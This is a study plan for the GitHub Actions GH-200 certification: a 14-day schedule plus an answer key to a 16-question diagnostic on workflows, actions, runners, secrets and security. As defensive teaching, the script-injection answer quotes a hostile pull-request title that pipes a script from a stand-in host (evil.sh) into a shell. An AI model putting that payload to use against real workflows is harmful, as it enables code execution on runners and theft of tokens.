# GH-200 (GitHub Actions) — 14-Day Study Plan

**Tracker:** https://claude.ai/artifact/7CiHNSgxbRsTT588VR6eQs

Six core blocks a day plus two optional, each 30 minutes. Block one of every
day from Day 2 onward is cold recall of everything so far — that spacing is what
converts this from reading into remembering, and it is the part people quietly
drop first. Treat it as non-negotiable.

---

## The exam

| | |
|---|---|
| Code | GH-200, delivered under Microsoft Learn credentials |
| Length | 100 minutes, proctored, may include interactive components |
| Pass | 700 of 1000, scaled |
| Price | Varies by region where proctored |
| Renewal | In transition to Microsoft's recertification model. Certs expiring before it lands get a 6-month extension; GitHub will supply a voucher for a first renewal attempt |
| Free prep | Official practice assessment and an exam sandbox, both linked from the credential page |

### Domains (skills measured as of January 2026)

| Domain | Weight |
|---|---|
| Author and manage workflows | 20–25% |
| Consume and troubleshoot workflows | 15–20% |
| Author and maintain actions | 15–20% |
| Manage GitHub Actions for the enterprise | 20–25% |
| Secure and optimize automation | 10–15% |

**The exam was significantly rewritten in January 2026** — new objectives,
reworded objectives, and a brand-new fifth domain. Most study material online
still describes the old four-domain version. Newly emphasised material: OIDC
cloud federation, immutable actions and SHA pinning, artifact attestations and
provenance, granular `GITHUB_TOKEN` permissions, YAML anchors and aliases,
service containers, REST-driven retention policies, and runner image migrations
(Ubuntu 20.04 removal, `windows-latest` → Windows Server 2025).

---

## Starting position

Two years of daily use, stopped eighteen months ago. That is cold recall plus
one rewrite, not a beginner's gap. Diagnostic score: 1 of 16, but the one
correct answer was secret precedence — an enterprise concept, which survives
disuse better than syntax does.

| Domain | Confidence | Note |
|---|---|---|
| Author and manage workflows | Low | Densest area, most drained |
| Consume and troubleshoot | Low | Reuse trio not recalled at all |
| Author and maintain actions | Low | No recall of types or metadata |
| Manage for the enterprise | Moderate | Scored the one correct answer here |
| Secure and optimize | Very low | Mostly postdates your last use |

---

## Day 0 — the lab, in thirty minutes

No org access and no day-job repo, so the lab is the only practical surface.
Almost all of the enterprise domain is recoverable on a free plan.

- **Create a free organization** and put one **public** repo in it, called
  `gh200-lab`. Public is not optional: org-level secrets and variables are not
  accessible from private repos on GitHub Free.
- **Environments and protection rules** — required reviewers, wait timers,
  branch policies — are available on Free for public repositories. That unlocks
  the deployment-gate objectives.
- **Runner groups** work here. Per current docs, organizations on Free can
  create and manage additional runner groups using self-hosted runners.
  Register a runner on your Mac and put it in a group.
- **What you cannot reach:** enterprise-account-level policy, enterprise runner
  groups, IP allow lists at the enterprise tier, and the audit-log API. Those
  stay docs-only — read them, don't chase them. A 30-day Team trial is an option
  if you want the tier above.

Two consequences of having no work repo. **Over-invest in the lab on Day 0** — a
lab that is annoying to use is a lab you stop opening around Day 5. And **break
things deliberately**: the plan asks you to sabotage your own workflows and
debug them from logs alone, because in a real job that practice arrives free and
here it does not. Reading a working workflow teaches you far less than fixing a
broken one.

---

## Day 1 — Calibrate and build the lab

*Score yourself cold before you learn anything — it makes every later score meaningful.*

1. **Book the exam, open the sandbox.** Reserve the slot. Then open the exam sandbox to see the real question UI, and read the Skills Measured list end to end without studying it.
2. **Take the official practice assessment — cold.** No preparation, no notes. Record the score and the per-domain split. You will do badly. That number is your baseline, not a verdict.
3. **Create the free org and public lab repo.** New organization, one public repo named `gh200-lab`. Enable Actions. Walk every page under org Settings → Actions and note what you can reach.
4. **Register a self-hosted runner.** Install the runner on your Mac against a repo, label it, run a hello-world job on it. Then put it in a runner group.
5. **Write a workflow from scratch, no copy-paste.** `on: push`, one job, three steps. Typing it from memory is the point — every time you reach for a reference, note which key you forgot.
6. **`workflow_dispatch` with typed inputs.** Add `choice` and `boolean` inputs with defaults and required flags. Run it from the UI. Read them back through the `inputs` context.

*Optional:* Read "Understanding GitHub Actions" start to finish · Skim the full workflow syntax reference (building a map of where things live, not memorising).

## Day 2 — Contexts, expressions, passing data

*The single densest area of domain 1, and the thing that has drained out of you most.*

1. **Recall: yesterday, from memory.** Write out Day 1's workflow on a blank page. No notes. Mark every gap.
2. **Tour every context.** Dump `github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `strategy`, `job` and `steps` into `GITHUB_STEP_SUMMARY` with `toJSON()`. Read what is actually in each one.
3. **`GITHUB_ENV` vs `GITHUB_OUTPUT`.** Build a three-step job using both. Then pass a value between two jobs via `jobs.<id>.outputs` and `needs.<id>.outputs`. This is diagnostic Q1 — make it muscle memory.
4. **Expression functions.** `contains`, `startsWith`, `endsWith`, `format`, `join`, `fromJSON`, `hashFiles`. Then the status checks: `success()`, `failure()`, `always()`, `cancelled()`.
5. **Context availability — what is legal where.** Learn the availability table. Job-level `if:` allows `github`, `needs`, `vars` and `inputs` — not `env`, not `secrets`, not `steps`. Exam-favourite territory.
6. **Job summaries.** Write a Markdown table of results to `GITHUB_STEP_SUMMARY`, with links. Add a status badge to the repo README.

*Optional:* Workflow commands (`::group::`, `::add-mask::`, `::error file=,line=`, `GITHUB_PATH`) · Multiline heredoc syntax for `GITHUB_ENV` and `GITHUB_OUTPUT`.

## Day 3 — Matrices, dependencies, services

*Where the tricky questions live — include/exclude semantics catch almost everyone.*

1. **Recall: contexts and data passing.** Blank page. Which context is unavailable in a job-level `if`? What reads a step output?
2. **Matrix with two axes.** Build it. Then add `include` and `exclude` and predict the expansion before you run it. `include` can add new values, not just annotate existing ones — prove it to yourself.
3. **`fail-fast`, `max-parallel`, `continue-on-error`.** Default `fail-fast` cancels the whole matrix on first failure. Turn it off and watch the difference. Understand what skipped vs failed vs cancelled does downstream.
4. **`needs` fan-in and fan-out.** Build a diamond. Gate the last job with `if: always()` and `if: failure()`. Read `needs.X.result` — and learn that for a matrix it aggregates to one value.
5. **Service containers.** Stand up postgres with `services:`. Set `ports`, `env`, and `options` with a health check. Connect from the job. Then run the job inside `container:` and see how addressing changes.
6. **Concurrency and timeouts.** `concurrency.group` with `cancel-in-progress`, `timeout-minutes` at job and step level.

*Optional:* `env` precedence across workflow/job/step · Ten cron expressions, written and read back.

## Day 4 — YAML mechanics and the three reuse models

*Anchors are new to the exam; the three-way distinction is asked every time.*

1. **Recall: matrix and dependencies.** From memory: what does `fail-fast` default to, and what does it do?
2. **YAML anchors, aliases, merge keys.** Write one with `&`, `*` and `<<:`. Then hand-expand an anchored workflow you did not write — the exam asks you to read them, not just write them. Note they are file-scoped and cannot cross files.
3. **Reusable workflows.** `on: workflow_call` with `inputs`, `secrets` and `outputs`. Call it from another repo with `jobs.<id>.uses`. Learn the nesting limit and what a called workflow cannot do.
4. **`secrets: inherit` vs explicit mapping.** Build both. Understand that inherit passes everything the caller can see, and why that is convenient and broad.
5. **Starter workflows.** Create the `.github` repo in your org, add `workflow-templates/` with a `.yml` and its `.properties.json`, then create a workflow from it in the lab repo.
6. **Write the three-way table from memory.** Starter vs reusable vs composite: where the definition lives, how it is invoked, and whether changes propagate. This is diagnostic Q7.

*Optional:* `workflow_run`, `repository_dispatch`, and full event filter syntax · Disabling vs deleting a workflow, and the `gh workflow` CLI.

## Day 5 — Custom actions I: building all three types

*You will write each kind by hand; nothing else makes this stick.*

1. **Recall: the three reuse models.** Blank page, three rows, no notes.
2. **`action.yml` metadata.** `name`, `description`, `author`, `inputs`, `outputs`, `runs`, `branding`. Which fields are required for each action type.
3. **Build a composite action.** `runs.using: composite`. Every `run` step needs its own `shell:`. Wire inputs through, and set outputs via `GITHUB_OUTPUT` plus `outputs.<x>.value`.
4. **Build a JavaScript action.** `runs.using: node20` with `main`, `pre` and `post`. Use `@actions/core` for inputs and outputs. Bundle with `ncc` and commit `dist/` — the runner never runs `npm install`.
5. **Build a Docker action.** `runs.using: docker` with a Dockerfile, `args` and `env`. Understand why it is Linux-only and slower to start.
6. **Break them on purpose.** Remove a `shell:`, misname an input, ship unbundled deps. Read the errors until each failure mode is recognisable at a glance.

## Day 6 — Custom actions II: versioning and distribution

*Versioning connects straight into the security domain.*

1. **Recall: action types and metadata.** Three types, required `runs` keys, metadata filename.
2. **Semver and the moving major tag.** Publish `v1.0.0`, then move a `v1` tag onto it. Build the release workflow that does the retag.
3. **Immutable actions and SHA pinning.** What immutability changes, how released versions are made unchangeable, and why the exam's preferred answer is always a full 40-character commit SHA.
4. **Marketplace publishing.** Requirements: public repo, `action.yml` at the root, unique name, a release with a tag. Walk the publish flow without finishing it.
5. **Distribution models.** Public repo, private repo inside the org, same-repo `./path` reference, Marketplace. When each is right.
6. **Debug logging.** `ACTIONS_STEP_DEBUG` and `ACTIONS_RUNNER_DEBUG` as secrets. Re-run a failed job with debug logging and read the extra output.

*Optional:* Action inputs deep-dive (defaults, required, `deprecationMessage`, how `INPUT_` env vars are derived) · Publish your composite action end to end.

## Day 7 — Midpoint self-test and repair

*Half-time. Find out what week one actually bought you — by building, not by answering questions.*

1. **Recall: everything so far.** All four days, blank page, twenty minutes.
2. **Build from blank: a full CI workflow.** Empty file, no docs, no autocomplete, no copy-paste. Matrix across three OS, a dependent job, cached dependencies, a value passed between jobs, and a job summary. Time yourself.
3. **Build from blank: the reuse trio.** From memory: a reusable workflow with typed inputs and a secret, a composite action that wraps three steps and sets an output, and a starter workflow template with its `.properties.json`.
4. **Mark your own work against the docs.** Diff what you wrote against the reference. Every gap is a card. Be harsh — a workflow that would not run is a fail, not a near miss.
5. **Official practice assessment, second sitting.** Free, and the only externally-scored signal you get. Compare the per-domain split against your Day 1 baseline.
6. **Repair the weakest area, hands-on.** Whatever the last two blocks exposed. Build it in the lab rather than re-reading it.

*Optional:* Repair the second weakest · Update your recall deck.

## Day 8 — Enterprise I: policies and governance

*Joint-heaviest domain, and your lab org can demonstrate most of it.*

1. **Recall: week one, compressed.** Ten minutes, the headline facts only.
2. **Org Actions policies.** Disabled, allow all, allow enterprise/org only, and Allow select actions — with the verified-creator toggle and specific action patterns (`owner/*`, `owner/repo@ref`).
3. **Fork and outside-contributor policy.** Approval requirements for fork PRs, why secrets are withheld from fork PRs, and why `pull_request_target` plus checking out PR head is dangerous.
4. **Default `GITHUB_TOKEN` permissions at org and repo.** Set the default to read-only, then watch which workflows break and fix them with explicit `permissions:` blocks.
5. **Secrets and variables at all three scopes.** Create the same name at org, repo and environment level in your public lab repo. Prove the precedence you already guessed right.
6. **Secrets via the REST API.** List, create and update — including the libsodium public-key encryption step — plus variables and org-level selected-repository access.

## Day 9 — Enterprise II: runners at scale

*The part you cannot get from a personal repo, which is why you built the lab.*

1. **Recall: org policies.** Blank page: name the four Actions policy settings.
2. **GitHub-hosted runners.** Labels, `runs-on` with an array, larger runners, and the runner-images repo. Find the preinstalled tool list and the toolcache for `ubuntu-latest`.
3. **Runner image migrations.** Ubuntu 20.04 removal and `windows-latest` moving to Windows Server 2025. How to pin an image and how to read the deprecation notices.
4. **Self-hosted: install, label, group.** Configure, label, and add to a runner group. Set the group's access policy for repositories and workflows. Try `--ephemeral`.
5. **Self-hosted security.** Why you never attach self-hosted runners to public repos — arbitrary PR code, persistent state between jobs. This is diagnostic Q13. Then read on ARC and autoscaling as concepts.
6. **Installing software at runtime.** `setup-*` actions, package managers, `container:` jobs, and caching the installs.

*Optional:* IP allow lists and networking, and at which tier they apply · Runner monitoring, status, logs, common registration failures.

## Day 10 — Enterprise III: the API and reading failures

*Domain 2 is mostly this: can you diagnose a run you did not write.*

1. **Recall: runners.** Groups, labels, ephemeral, and the public-repo rule.
2. **Retention, set two ways.** Artifact and log retention in org and repo settings, then the same thing through the REST API. The study guide calls out the API explicitly.
3. **The workflow runs API.** List runs, re-run, re-run failed jobs only, cancel, download logs and artifacts. Do each one with `curl` or `gh`.
4. **Diagnose three broken workflows from logs alone.** Write three that fail for different reasons, leave them a day, then debug only from the run log. No looking at the YAML first.
5. **Matrix troubleshooting.** Correlate a job name back to its matrix axes, and re-run a single failed variant without re-running the rest.
6. **Artifacts and logs in the UI and API.** Where everything lives, and the v4 artifact behaviour changes.

## Day 11 — Security: the new fifth domain

*Ten to fifteen percent of the exam, and close to zero percent of your current recall.*

1. **Recall: API and troubleshooting.** Blank page: how do you re-run only failed jobs?
2. **`GITHUB_TOKEN` lifecycle.** Ephemeral, job-scoped, expires at job end. `permissions:` at workflow and job level. Contrast with classic PATs, fine-grained PATs and GitHub App tokens — when each is correct.
3. **Exploit a script injection, then fix it.** Put `${{ github.event.issue.title }}` inside a `run:` in your lab and break it with a crafted title. Then fix it three ways. This is diagnostic Q15 and it is asked every sitting.
4. **OIDC cloud federation.** `permissions: id-token: write`, the `sub` claim format (`repo:org/repo:ref:...` and `:environment:...`), and the cloud-side trust policy. What it lets you delete.
5. **Supply chain: pinning and allow-lists.** Full-SHA pins, Dependabot for actions, org allow-lists, and `actions/checkout` `persist-credentials`.
6. **Artifact attestations.** `actions/attest-build-provenance`, verifying with `gh attestation verify`, and where SLSA provenance fits in a deployment gate.

## Day 12 — Optimisation, caching, environments

*Cheap marks — cache semantics are mechanical once you have seen them.*

1. **Recall: security.** OIDC permission, the injection fix, the pinning rule.
2. **Caching properly.** `actions/cache` with `key`, `restore-keys` and `path`. Exact vs prefix match, branch scoping and isolation, eviction, and the `cache-hit` output. Then the built-in caching in `setup-node` and friends.
3. **Artifacts vs cache.** When each is correct, retention, `overwrite`, and v4 immutability.
4. **Environments and deployment gates.** Create one on the public lab repo with required reviewers, a wait timer and a branch policy. Add environment secrets. Watch a job pause for approval.
5. **Cost and scale.** Path and branch filters, `paths-ignore`, concurrency to kill redundant runs, trimming matrices, larger-runner tradeoffs, and billing multipliers by OS.
6. **Sweep the Skills Measured list.** Every bullet, self-rated green, amber or red. The ambers are tomorrow's targets.

## Day 13 — Final self-test and targeted repair

*Last heavy day. Everything after this is consolidation.*

1. **Recall: all five domains.** Thirty minutes, blank page, no notes.
2. **Teach it back, out loud.** Explain OIDC federation, script injection, and the starter/reusable/composite distinction as though to a colleague who has never seen them. Where you stall mid-sentence is exactly where the knowledge is thin.
3. **Build from blank: a secure deployment workflow.** Environment gate with a required reviewer, OIDC instead of stored cloud credentials, every third-party action SHA-pinned, least-privilege `permissions` block, build provenance attestation. No references.
4. **Official practice assessment, final sitting.** Compare against Day 1 and Day 7. The trend matters more than the absolute number — if it is still climbing you are fine.
5. **Repair the weakest domain.** Hands-on in the lab, not re-reading.
6. **Skills Measured, final sweep.** Every bullet rated green, amber or red. Tomorrow you touch only the reds.

*Optional:* Re-read every note you wrote, end to end · Second pass on reds only.

## Day 14 — Consolidate, then stop

*Do not learn anything new today. You cannot, and trying will cost you.*

1. **Recall deck, the whole thing.** One pass, start to finish.
2. **Read your own notes, end to end.** Yours, not the docs. Your notes are indexed to your own gaps.
3. **Skills Measured, final self-rate.** Touch only what is still red. Accept anything amber.
4. **The three comparison tables.** Starter vs reusable vs composite. Secret scopes and precedence. The three action types. Written from memory, one last time.
5. **Logistics check.** Photo ID, quiet room, system check with the proctor software, everything else closed. Re-open the exam sandbox so the interface is familiar.
6. **Stop early and sleep.** The last block is deliberately empty. Cramming past this point trades recall for anxiety at roughly one to one.

---

# Appendix — answer key to the 16-question diagnostic

This is Day 1's reading. Work through it once, then use it as the seed for your
recall deck.

### Q1. `GITHUB_ENV` vs `GITHUB_OUTPUT`

Both are **files** you append `key=value` to, not variables you assign.

`GITHUB_ENV` sets an environment variable visible to every *subsequent step in
the same job*, readable as `$MY_VAR` in a shell or `${{ env.MY_VAR }}` in an
expression.

`GITHUB_OUTPUT` sets a *step output*. The producing step must have an `id`, and
later steps read it as `${{ steps.<id>.outputs.<name> }}`.

```yaml
- id: build
  run: echo "version=1.4.2" >> "$GITHUB_OUTPUT"
- run: echo "${{ steps.build.outputs.version }}"
```

Crossing a *job* boundary needs a third thing: declare `jobs.<id>.outputs`
mapping to the step output, then read `needs.<id>.outputs.<name>` downstream.

### Q2. Job B only when job A failed, where A was a 4-way matrix

Jobs default to `if: success()`, so a failure gate must be explicit:

```yaml
b:
  needs: a
  if: ${{ failure() }}
```

Or the more precise `if: ${{ needs.a.result == 'failure' }}`.

**The matrix catch:** `needs.a.result` is a *single aggregated value* for the
entire matrix, not one per variant. It reports `failure` if any variant failed
and `success` only if all of them passed. There is no way to branch on one
specific variant's result through `needs` — if you need that, have each variant
write an output or artifact.

### Q3. `fail-fast: false` and `max-parallel`

`fail-fast` defaults to `true`: the moment any matrix job fails, GitHub cancels
every other in-progress and queued job in that matrix. Setting it to `false`
lets every variant run to completion — which is what you want when you need to
know whether the failure is Windows-only or universal.

`max-parallel` caps how many matrix jobs run at once. It is a throttle for
runner capacity, licence limits or a rate-limited external service — nothing to
do with correctness or failure handling.

### Q4. Parse time vs runtime, and context availability

Your instinct was half right. **Parse time** — before any job starts, when the
run is created: `on:` filters, `strategy.matrix` expansion, `concurrency`, and
job-level `if:`. **Runtime**: anything depending on `steps`, on `env` written
during the run, or on `runner`.

The exam-favourite fact is the availability table. In `jobs.<id>.if` you may use
**`github`, `needs`, `vars` and `inputs`** — and *not* `env`, `secrets`, `steps`
or `matrix`. A common wrong answer is gating a job on a secret's presence; you
cannot, so you promote it to a `vars` value or an output from an earlier job.

### Q5. YAML anchors, aliases, merge keys

`&name` defines an anchor, `*name` references it, and `<<:` merges a mapping
into the current one.

```yaml
x-defaults: &defaults
  shell: bash
  working-directory: ./app

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - <<: *defaults
        run: make build
      - <<: *defaults
        run: make test
```

**The limitation that makes it an exam question:** anchors are scoped to a
single YAML document. They cannot cross files, so they are not an alternative to
reusable workflows or composite actions — only to repetition inside one
workflow. The exam also asks you to *read* and expand anchored YAML, not just
write it.

### Q6. `services:`

Sidecar containers for the duration of a job — databases, caches, queues —
started by Docker on the runner and torn down after. Linux runners only.

```yaml
services:
  postgres:
    image: postgres:16
    env:
      POSTGRES_PASSWORD: pw
    ports: ['5432:5432']
    options: >-
      --health-cmd pg_isready
      --health-interval 10s
```

**The distinction they test:** if your job runs *directly on the runner*, you
need `ports` mapped and you connect to `localhost`. If the job itself runs in a
`container:`, Docker puts both on a user-defined network — you address the
service by its *label* as hostname (`postgres:5432`) and need no port mapping at
all.

### Q7. Starter vs reusable vs composite

| | Lives | Invoked | Updates propagate? |
|---|---|---|---|
| **Starter workflow** | Org's `.github` repo, under `workflow-templates/` with a `.properties.json` | Copied into a repo when someone creates a new workflow | **No** — independent the moment it is copied |
| **Reusable workflow** | Any repo, a real workflow with `on: workflow_call` | `jobs.<id>.uses: owner/repo/.github/workflows/x.yml@ref` | **Yes** — centrally versioned by ref |
| **Composite action** | An `action.yml` with `runs.using: composite` | `steps: - uses:` inside a job | **Yes** — versioned by ref |

Shortest way to hold it: a starter workflow is a *scaffold*, a reusable workflow
supplies whole *jobs*, a composite action supplies *steps*.

### Q8. Secrets into a reusable workflow, and `secrets: inherit`

The callee declares what it accepts; the caller maps them explicitly:

```yaml
# callee
on:
  workflow_call:
    secrets:
      TOKEN:
        required: true

# caller
jobs:
  call:
    uses: org/repo/.github/workflows/x.yml@v1
    secrets:
      TOKEN: ${{ secrets.NPM_TOKEN }}
```

`secrets: inherit` replaces that whole block and passes *every* secret available
to the caller — org, repo and environment — without naming any of them. It is
convenient and deliberately broad, which is why the security domain prefers
explicit mapping: inherit gives the called workflow access to secrets it never
declared a need for.

### Q9. The three action types and the metadata filename

**JavaScript**, **Docker container**, and **composite**.

The metadata file is `action.yml` (`action.yaml` is also accepted), at the *root
of the action's directory* — which for a Marketplace-published action means the
root of the repository.

### Q10. `runs.using` for a JavaScript action, and why bundle

```yaml
runs:
  using: node20
  main: dist/index.js
  post: dist/cleanup.js
```

`pre` and `post` are optional hooks that run before and after the job's other
steps.

**Why bundling matters:** the runner checks out your action and executes `main`
directly. It never runs `npm install`. So every dependency must already be in
the repository — either by committing `node_modules` (large, noisy, slow to
clone) or, far better, by compiling everything into one file with
`@vercel/ncc` and committing `dist/`. An unbundled action fails at runtime with
a module-not-found error, the single most common custom-action bug.

### Q11. The moving `v1` tag, and SHA pinning

You publish `v1.2.3` and also *move* a `v1` tag to point at that commit.
Consumers writing `uses: owner/action@v1` then pick up non-breaking updates
automatically, and you only break them at `v2`.

**The tension the exam wants you to name:** a moving tag is mutable by
definition, so if the action is compromised the code under `@v1` changes beneath
every consumer. Hence the preferred answer in any security-flavoured question is
**pin to the full 40-character commit SHA**, with Dependabot raising PRs to bump
the pins:

```yaml
uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8  # v5.0.1
```

**Immutable actions** close the gap from the other side: a released version is
published as a package and its contents can no longer change, so a version
reference becomes as trustworthy as a SHA.

### Q12. Secret precedence — *you had this one*

`environment > repository > organization` — the most specific scope wins, and
the others are simply not visible to that job.

Worth adding: environment secrets are only readable by a job that declares
`environment:`, and they are gated behind that environment's protection rules.
That makes them the correct answer whenever a question involves production
credentials plus an approval step.

### Q13. Runner groups, and the self-hosted public-repo caveat

A **runner group** collects runners and controls *which organizations,
repositories and workflows* may use them — the access boundary for runner
fleets. Enterprise accounts, orgs owned by them, and orgs on Team or Free can
all create additional groups for self-hosted runners.

**The caveat:** never attach self-hosted runners to public repositories. Anyone
can fork and open a pull request, and a workflow triggered by that PR executes
arbitrary code on your machine. Worse, self-hosted runners persist state between
jobs by default, so a compromise is not confined to one run — the attacker can
leave things behind. If you must, use ephemeral runners in disposable, isolated
environments.

### Q14. Restricting which actions an organization may use

Organization Settings → Actions → General → *Policies*. The choices escalate:

- Disable Actions entirely
- Allow all actions and reusable workflows
- Allow only actions and reusable workflows from within the enterprise or organization
- **Allow select actions** — which then exposes three independent toggles:
  actions created by GitHub, actions by Marketplace *verified creators*, and a
  free-text allow list of patterns such as `owner/*` or `owner/repo@ref`

Enterprise-level policy sits above this and can constrain what individual
organizations are permitted to choose.

### Q15. Why `run: echo "${{ github.event.pull_request.title }}"` is dangerous

Because `${{ }}` is interpolated into the script *as text, before the shell ever
runs*. A pull request titled `"; curl evil.sh | sh #` is substituted verbatim and
then executed on the runner, with the job's `GITHUB_TOKEN` and anything else in
scope. The attacker supplies the title; you supply the shell.

**The fix is indirection through the environment** — the value arrives as data,
never as script:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

Supporting controls: least-privilege `permissions:` so a successful injection
gains little, preferring vetted actions over inline shell, and never combining
`pull_request_target` with a checkout of the PR head — that trigger runs with
full write permissions and access to secrets.

### Q16. OIDC — the permission, and what it deletes

The job requests a token, so it needs:

```yaml
permissions:
  id-token: write
  contents: read
```

The runner then asks GitHub's OIDC provider for a short-lived JWT. Your cloud
validates the issuer and the `sub` claim — formatted like
`repo:org/name:ref:refs/heads/main` or `repo:org/name:environment:production` —
against a trust policy (an AWS IAM role trust relationship, an Azure federated
credential, a GCP workload identity pool) and returns short-lived cloud
credentials.

**What it deletes:** the long-lived cloud secrets themselves. No
`AWS_SECRET_ACCESS_KEY` stored in GitHub, nothing to rotate, nothing to leak —
and the trust policy scopes access down to a specific repo, branch or
environment, which a static key never could.

---

*Exam facts verified against the [GH-200 study guide](https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200)
and [credential page](https://learn.microsoft.com/en-us/credentials/certifications/github-actions/);
plan availability against [GitHub Docs](https://docs.github.com/en/actions).
Skills measured as of January 2026.*
